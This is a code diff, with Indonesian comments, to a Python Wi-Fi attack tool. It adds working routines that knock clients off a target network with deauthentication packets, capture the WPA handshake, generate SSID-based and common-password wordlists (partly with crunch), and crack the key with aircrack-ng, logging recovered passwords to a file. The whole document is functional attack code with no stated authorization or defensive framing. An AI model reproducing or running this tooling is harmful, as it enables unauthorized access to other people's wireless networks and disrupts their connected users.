@@ -1460,25 +1460,45 @@ def dictionary_attack(target):
         print(f"❌ Dictionary attack failed: {e}")
 
 def brute_force_attack(target):
-    """Brute force attack dengan pattern tertentu"""
+    """Brute force attack dengan pattern yang realistis"""
     print(f"\n💪 BRUTE FORCE ATTACK ON {target['essid']}")
     print("=" * 50)
     
-    print("🔄 Generating password patterns...")
+    print("🔄 Generating smart password patterns...")
     
     # Buat pattern berdasarkan SSID (common patterns)
-    ssid = target['essid'].lower()
+    ssid = target['essid'].lower().replace(' ', '')
     patterns = []
     
-    # Common patterns
+    # Smart patterns berdasarkan SSID
     patterns.extend([
-        f"{ssid}123", f"{ssid}1234", f"{ssid}12345",
-        f"{ssid}2023", f"{ssid}2024",
-        f"password", f"password123",
-        f"admin", f"admin123",
-        f"12345678", f"1234567890",
-        f"qwerty", f"qwerty123"
+        # Basic patterns
+        f"{ssid}", f"{ssid}123", f"{ssid}1234", f"{ssid}12345",
+        f"{ssid}2023", f"{ssid}2024", f"{ssid}2025",
+        f"{ssid}!", f"{ssid}@", f"{ssid}#",
+        
+        # Common password patterns
+        f"password", f"password123", f"password{ssid}",
+        f"admin", f"admin123", f"admin{ssid}",
+        f"12345678", f"123456789", f"1234567890",
+        f"qwerty", f"qwerty123", f"qwertyuiop",
+        f"letmein", f"welcome", f"hello{ssid}",
+        
+        # Number sequences
+        f"11111111", f"88888888", f"99999999",
+        f"12341234", f"123123123", f"00000000",
+        
+        # Date patterns
+        f"01012000", f"01012024", f"01011980",
+        f"25081995", f"31121999",
     ])
+    
+    # Tambahkan patterns berdasarkan karakteristik SSID
+    if any(char.isdigit() for char in ssid):
+        # Jika SSID mengandung angka
+        numbers = ''.join(filter(str.isdigit, ssid))
+        if numbers:
+            patterns.extend([f"{numbers}", f"{numbers}123", f"{numbers}{numbers}"])
     
     # Simpan patterns ke file
     pattern_file = f"{CRACK_LOG_DIR}/brute_patterns.txt"
@@ -1486,57 +1506,220 @@ def brute_force_attack(target):
         for pattern in patterns:
             f.write(pattern + "\n")
     
-    print(f"✅ Generated {len(patterns)} patterns")
+    print(f"✅ Generated {len(patterns)} smart patterns")
     
-    # Gunakan crunch untuk generate lebih banyak kombinasi
+    # Gunakan crunch dengan parameter yang lebih realistis
     try:
-        print("🔄 Generating additional combinations with crunch...")
-        subprocess.run([
-            "crunch", "8", "12", "1234567890abcdef",
+        print("🔄 Generating additional combinations with crunch (optimized)...")
+        
+        # Parameter yang lebih realistis untuk mobile device
+        crunch_proc = subprocess.Popen([
+            "crunch", "6", "8", "1234567890",  # Hanya angka, panjang 6-8
             "-o", f"{CRACK_LOG_DIR}/crunch_output.txt"
-        ], timeout=30)
+        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        # Timeout lebih pendek, hanya generate 10 detik
+        try:
+            stdout, stderr = crunch_proc.communicate(timeout=10)
+            print("✅ Crunch generation completed")
+        except subprocess.TimeoutExpired:
+            print("⏰ Crunch timeout - using generated data so far")
+            crunch_proc.terminate()
         
         # Combine files
-        with open(f"{CRACK_LOG_DIR}/combined_wordlist.txt", "w") as outfile:
-            # Patterns
+        combined_file = f"{CRACK_LOG_DIR}/combined_wordlist.txt"
+        total_lines = 0
+        
+        with open(combined_file, "w") as outfile:
+            # Tambahkan patterns
             with open(pattern_file, "r") as infile:
-                outfile.write(infile.read())
+                patterns_content = infile.read()
+                outfile.write(patterns_content)
+                total_lines += len(patterns_content.splitlines())
             
-            # Crunch output (first 10000 lines)
+            # Tambahkan crunch output jika ada (maksimal 5000 lines)
             if os.path.exists(f"{CRACK_LOG_DIR}/crunch_output.txt"):
                 with open(f"{CRACK_LOG_DIR}/crunch_output.txt", "r") as infile:
-                    for i, line in enumerate(infile):
-                        if i < 10000:
-                            outfile.write(line)
+                    lines_added = 0
+                    for line in infile:
+                        if lines_added < 5000:  # Batasi agar tidak terlalu besar
+                            outfile.write(line.strip() + "\n")
+                            lines_added += 1
+                            total_lines += 1
                         else:
                             break
+                print(f"✅ Added {lines_added} lines from crunch")
         
-        print("🔄 Starting brute force attack...")
-        # Lakukan attack similar to dictionary attack
+        print(f"📊 Total wordlist size: {total_lines} passwords")
+        
+        # Cek jika handshake file ada
+        handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
+        if not os.path.exists(handshake_file):
+            print("❌ No handshake file found. Capturing handshake first...")
+            if not capture_handshake(target):
+                print("❌ Failed to capture handshake")
+                return
+        
+        print("🔄 Starting optimized brute force attack...")
+        
+        result = subprocess.run([
+            "aircrack-ng",
+            handshake_file,
+            "-w", combined_file,
+            "-l", f"{CRACK_LOG_DIR}/brute_password.txt"
+        ], capture_output=True, text=True, timeout=300)  # Timeout 5 menit
+        
+        if "KEY FOUND" in result.stdout:
+            print("🎉 PASSWORD CRACKED WITH BRUTE FORCE!")
+            lines = result.stdout.split('\n')
+            for line in lines:
+                if "KEY FOUND" in line:
+                    password = line.split('[')[1].split(']')[0]
+                    print(f"🔑 Password: {password}")
+                    with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
+                        f.write(f"{target['essid']} : {password} : BRUTE_FORCE : {datetime.now()}\n")
+                    break
+        else:
+            print("❌ Brute force attack failed - password not in wordlist")
+            print("💡 Try dictionary attack or WPS attack instead")
+        
+    except subprocess.TimeoutExpired:
+        print("⏰ Brute force attack timed out")
+        print("💡 Wordlist too large for mobile device")
+    except Exception as e:
+        print(f"❌ Brute force attack failed: {e}")
+
+def capture_handshake(target):
+    """Capture WPA handshake untuk attack"""
+    print("🔄 Capturing WPA handshake...")
+    
+    try:
+        # Deauthenticate clients untuk trigger handshake
+        print("   Sending deauth packets...")
+        deauth_proc = subprocess.Popen([
+            "aireplay-ng", 
+            "--deauth", "5",  # Kurangi jumlah deauth
+            "-a", target['bssid'],
+            "wlan0"
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        # Capture handshake
+        print("   Capturing handshake (10 seconds)...")
+        capture_proc = subprocess.Popen([
+            "airodump-ng",
+            "--bssid", target['bssid'],
+            "--channel", target['channel'],
+            "--write", f"{CRACK_LOG_DIR}/handshake",
+            "wlan0"
+        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        
+        time.sleep(10)
+        capture_proc.terminate()
+        deauth_proc.terminate()
+        
+        # Cek jika handshake berhasil di-capture
         handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
         if os.path.exists(handshake_file):
+            # Verifikasi handshake
             result = subprocess.run([
                 "aircrack-ng",
                 handshake_file,
-                "-w", f"{CRACK_LOG_DIR}/combined_wordlist.txt",
-                "-l", f"{CRACK_LOG_DIR}/brute_password.txt"
-            ], capture_output=True, text=True, timeout=600)
+                "-w", "/dev/null"  # Test dengan wordlist kosong
+            ], capture_output=True, text=True, timeout=30)
             
-            if "KEY FOUND" in result.stdout:
-                print("🎉 PASSWORD CRACKED WITH BRUTE FORCE!")
-                lines = result.stdout.split('\n')
-                for line in lines:
-                    if "KEY FOUND" in line:
-                        password = line.split('[')[1].split(']')[0]
-                        print(f"🔑 Password: {password}")
-                        with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
-                            f.write(f"{target['essid']} : {password} : BRUTE_FORCE : {datetime.now()}\n")
-                        break
+            if "1 handshake" in result.stdout:
+                print("✅ WPA handshake captured and verified!")
+                return True
             else:
-                print("❌ Brute force attack failed")
-        
+                print("❌ No valid handshake captured")
+                return False
+        else:
+            print("❌ Handshake file not created")
+            return False
+            
     except Exception as e:
-        print(f"❌ Brute force attack failed: {e}")
+        print(f"❌ Handshake capture failed: {e}")
+        return False
+
+def smart_brute_force_attack(target):
+    """Smart brute force tanpa menggunakan crunch"""
+    print(f"\n🧠 SMART BRUTE FORCE ATTACK ON {target['essid']}")
+    print("=" * 50)
+    
+    # Generate smart patterns berdasarkan SSID analysis
+    ssid = target['essid'].lower()
+    wordlist = generate_smart_patterns(ssid)
+    
+    print(f"✅ Generated {len(wordlist)} intelligent patterns")
+    
+    # Save to file
+    wordlist_file = f"{CRACK_LOG_DIR}/smart_wordlist.txt"
+    with open(wordlist_file, "w") as f:
+        for password in wordlist:
+            f.write(password + "\n")
+    
+    # Lakukan attack
+    handshake_file = f"{CRACK_LOG_DIR}/handshake-01.cap"
+    if not os.path.exists(handshake_file):
+        print("❌ No handshake file found")
+        return
+    
+    print("🔄 Starting smart brute force attack...")
+    
+    try:
+        result = subprocess.run([
+            "aircrack-ng",
+            handshake_file,
+            "-w", wordlist_file,
+            "-l", f"{CRACK_LOG_DIR}/smart_password.txt"
+        ], capture_output=True, text=True, timeout=180)  # 3 menit timeout
+        
+        if "KEY FOUND" in result.stdout:
+            print("🎉 PASSWORD CRACKED WITH SMART BRUTE FORCE!")
+            lines = result.stdout.split('\n')
+            for line in lines:
+                if "KEY FOUND" in line:
+                    password = line.split('[')[1].split(']')[0]
+                    print(f"🔑 Password: {password}")
+                    with open(f"{CRACK_LOG_DIR}/cracked_passwords.txt", "a") as f:
+                        f.write(f"{target['essid']} : {password} : SMART_BRUTE_FORCE : {datetime.now()}\n")
+                    break
+        else:
+            print("❌ Smart brute force failed")
+            
+    except subprocess.TimeoutExpired:
+        print("⏰ Smart brute force timed out")
+
+def generate_smart_patterns(ssid):
+    """Generate smart patterns berdasarkan analisis SSID"""
+    patterns = set()
+    
+    # Basic SSID variations
+    patterns.add(ssid)
+    patterns.add(ssid + "123")
+    patterns.add(ssid + "1234")
+    patterns.add(ssid + "12345")
+    patterns.add(ssid + "2024")
+    patterns.add(ssid + "!")
+    
+    # Common substitutions
+    if 'a' in ssid: patterns.add(ssid.replace('a', '4'))
+    if 'e' in ssid: patterns.add(ssid.replace('e', '3'))
+    if 'i' in ssid: patterns.add(ssid.replace('i', '1'))
+    if 'o' in ssid: patterns.add(ssid.replace('o', '0'))
+    if 's' in ssid: patterns.add(ssid.replace('s', '5'))
+    
+    # Capitalization variations
+    patterns.add(ssid.upper())
+    patterns.add(ssid.capitalize())
+    
+    # Remove spaces and special chars
+    clean_ssid = ''.join(e for e in ssid if e.isalnum())
+    if clean_ssid != ssid:
+        patterns.add(clean_ssid)
+        patterns.add(clean_ssid + "123")
+    
+    return list(patterns)
 
 def wps_attack(target):
     """WPS Pin attack menggunakan reaver atau bully"""
